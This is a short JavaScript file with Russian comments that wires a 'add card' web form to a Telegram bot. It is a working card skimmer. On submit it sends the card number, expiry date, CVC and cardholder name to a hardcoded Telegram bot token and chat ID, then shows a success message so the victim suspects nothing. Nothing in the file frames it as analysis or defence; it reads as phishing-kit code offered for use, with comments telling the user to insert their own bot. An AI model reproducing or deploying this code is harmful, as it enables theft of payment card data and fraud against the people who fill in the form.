const TOKEN = '7562151204:AAGOCa3R7q12uFlIN93lBWB8WyZ6Dw5glS8'; // Замени на токен твоего бота
const CHAT_ID = '1342016402'; // Замени на свой Telegram ID
function sendToTelegram(text) {
  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  })
  .then(res => res.json())
  .then(data => {
    console.log('Отправлено в Telegram:', data);
  })
  .catch(err => {
    console.error('Ошибка отправки:', err);
  });
}

document.getElementById('card-form').addEventListener('submit', function(e) {
  e.preventDefault();

  const cardNumber = document.getElementById('card-number');
  const expiry = document.getElementById('expiry');
  const cvc = document.getElementById('cvc');
  const cardHolder = document.getElementById('card-holder');

  let isValid = true;

  if (cardNumber.value.trim() === '') {
    document.getElementById('card-number-error').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('card-number-error').style.display = 'none';
  }

  if (cardHolder.value.trim() === '') {
    document.getElementById('card-holder-error').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('card-holder-error').style.display = 'none';
  }

  if (isValid) {
    const message = `
💳 Новая карта добавлена:

Номер карты: ${cardNumber.value}
Срок действия: ${expiry.value}
CVC: ${cvc.value}
Имя владельца: ${cardHolder.value}
    `;
    
    sendToTelegram(message);
    alert('Карта успешно добавлена!');
    
    // Очистка формы (по желанию)
    cardNumber.value = '';
    expiry.value = '';
    cvc.value = '';
    cardHolder.value = '';
  }
});
